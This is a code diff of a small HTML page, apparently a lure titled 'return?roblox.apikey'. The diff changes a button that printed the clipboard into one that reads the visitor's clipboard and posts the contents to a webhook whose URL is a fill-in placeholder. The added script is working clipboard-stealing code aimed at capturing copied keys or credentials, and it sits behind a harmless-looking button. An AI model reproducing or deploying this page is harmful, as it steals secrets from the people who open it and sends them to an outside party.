@@ -3,18 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Clipboard Access</title>
+    <title>return?roblox.apikey</title>
 </head>
 <body>
-    <button onclick="printClipboardContent()">Print Clipboard Content</button>
+    <button onclick="sendClipboardToWebhook()">Send Clipboard Content to Webhook</button>
 
     <script>
-        async function printClipboardContent() {
+        async function sendClipboardToWebhook() {
             try {
                 const text = await navigator.clipboard.readText();
                 console.log("Clipboard content:", text);
-            } catch (err) {
-                console.error("Failed to read clipboard content:", err);
+                const webhookURL = 'YOUR_WEBHOOK_URL';
+                const message = {
+                    content: text,
+                };
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                });
+
+                if (response.ok) {
+                    console.log("Message sent successfully!");
+                } else {
+                    console.error("Failed to send message:", response.statusText);
+                }
+            } catch (error) {
+                console.error("Error:", error);
             }
         }
     </script>
